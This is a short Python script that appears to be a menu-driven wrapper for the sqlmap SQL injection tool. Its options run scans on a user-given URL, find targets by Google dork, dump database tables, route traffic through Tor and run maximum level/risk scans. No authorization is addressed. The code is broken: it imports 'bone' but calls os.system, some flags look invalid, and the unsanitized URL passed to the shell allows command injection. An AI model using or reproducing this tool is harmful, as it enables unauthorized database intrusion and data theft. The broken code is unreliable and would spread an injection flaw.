import bone

# Ask the user to enter a site to test for SQL injection
site = input("Enter the URL to test for SQL injection: ")

# Options available with description
options = {
     '1': 'Run a SQL injection test on the user-specified site',
     '2': 'Automate the testing process using a recording file',
     '3': 'Extract data from target database',
     '4': 'Automate the testing process using Google Dork',
     '5': 'Use the Tor network to protect user identity',
     '6': 'Authenticate with a specific username and password',
     '7': 'Automate the testing process using a list of URLs',
     '8': 'Use an SSL connection to encrypt communications',
     '9': 'Use a proxy to make HTTP requests',
     '10': 'Use multiple threads to speed up the testing process',
     '11': 'Use all available options to perform a full SQL injection test'
}

# Show available options with description
print("Available options:")
for key, value in options.items():
     print(key + "." + value)

# Ask the user to choose an option
option = input("Enter the option number to use: ")

# Run selected option
if option in options:
     if option == '1':
         os.system(f'sqlmap -u "{site}" --batch')
     elif option == '2':
         os.system(f'sqlmap -r request.txt --batch')
     elif option == '3':
         os.system(f'sqlmap -D dbname -T tablename -C columnname --dump')
     elif option == '4':
         os.system(f'sqlmap -g "inurl:index.php?id=" --batch')
     elif option == '5':
         os.system(f'sqlmap -u "{site}" --tor')
     elif option == '6':
         os.system(f'sqlmap -u "{site}" --auth-type="BASIC" --auth-cred="user:password" --batch')
     elif option == '7':
         os.system(f'sqlmap -m urls.txt --batch')
     elif option == '8':
         os.system(f'sqlmap -u "{site}" --ssl --ignore-ssl-errors')
     elif option == '9':
         os.system(f'sqlmap -u "{site}" --proxy="http://127.0.0.1:8080" --batch')
     elif option == '10':
         os.system(f'sqlmap -u "{site}" --threads=5 --batch')
     elif option == '11':
         os.system(f'sqlmap -u "{site}" --level=5 --risk=3 --cookie="user=admin;password=pass" --dbms="MySQL" --os="Linux " --current-user --current-db --hostname --timeout=10 --fresh-queries --hex --output-format="csv" --batch')
else:
     print("Invalid option")
